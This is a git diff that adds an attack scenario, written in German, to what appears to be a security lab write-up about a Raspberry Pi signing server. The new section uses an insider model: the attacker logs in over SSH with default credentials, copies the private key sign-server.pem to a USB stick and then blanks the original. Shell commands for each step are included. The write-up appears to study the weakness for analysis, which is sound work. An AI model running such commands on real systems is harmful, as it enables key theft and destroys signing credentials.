@@ -155,5 +155,44 @@ $ sudo systemctl enable sign-server-autostart.service
 
 ## 5. Angriff
 
+Das vorliegende Angreifermodell geht von einem Insider aus, der über tiefgreifende Kenntnisse des eingesetzten Systems verfügt. Es wird angenommen, dass der Raspberry Pi im Headless-Betrieb läuft, d. h. ohne angeschlossene Tastatur, Maus oder Display, wie es typischerweise in Produktionsumgebungen der Fall ist.
+
+Das Ziel des Angreifers besteht darin, den Private Key des Systems zu entwenden, um damit manipulierte Daten oder Software eigenständig signieren zu können. Ein solcher Schlüsselmissbrauch könnte beispielsweise dazu verwendet werden, veränderte Firmware auf einem Elektronikgerät zu starten, ohne dass dies vom System erkannt wird.
+
+Der Angriff verläuft in mehreren Schritten:
+
+**1. Physischer Zugriff:** Der Angreifer schafft es unbemerkt, einen USB-Stick in den Raspberry Pi einzustecken.
+**2. Exfiltration des Schlüssels:** Der USB-Stick dient als Mittel zur Datenexfiltration – insbesondere des Private Keys.
+**3. Remote-Zugriff via SSH:** Aufgrund des Headless-Betriebs erfolgt die Interaktion mit dem System über eine SSH-Verbindung. Der Angreifer nutzt hierfür Standard-Zugangsdaten, um sich Zugriff zum System zu verschaffen.
+**4. Dateizugriff und Manipulation:** 
+    -   Der eingesteckte USB-Stick wird gemountet.
+    -   Der Private Key wird ausgelesen, auf den Stick kopiert und auf dem System überschrieben.
+**5. Spurenbeseitigung:** Anschließend entfernt der Angreifer den USB-Stick wieder und verschiebt den entwendeten Schlüssel auf seinen eigenen Computer zur weiteren Nutzung.
+
+```shell
+# SSH Login
+$ ssh pi@192.168.0.103
+# USB Stick mounten (Automount ist deaktiviert)
+$ sudo mount /dev/sda1 /mnt
+# Exfiltration
+$ cp /home/pi/sign-server.pem /mnt
+# Key Überschreiben
+$ >/home/pi/sign-server.pem
+# USB Stick unmounten
+$ sudo umount /mnt
+# SSH Logout
+$ exit
+# 
+# Private Key vom USB Stick verschieben
+$ mv /media/lutz/LUTZ/sign-server.pem /home/lutz/
+# USB Stick anschließend "leer"
+$ ls -lisa /media/lutz/LUTZ
+insgesamt 8
+       1 4 drwxr-xr-x  2 lutz lutz 4096 Jan  1  1970 .
+79429634 4 drwxr-x---+ 3 root root 4096 Jun 23 10:50 ..
+```
+
 ## 6. Analyse
+
+
 
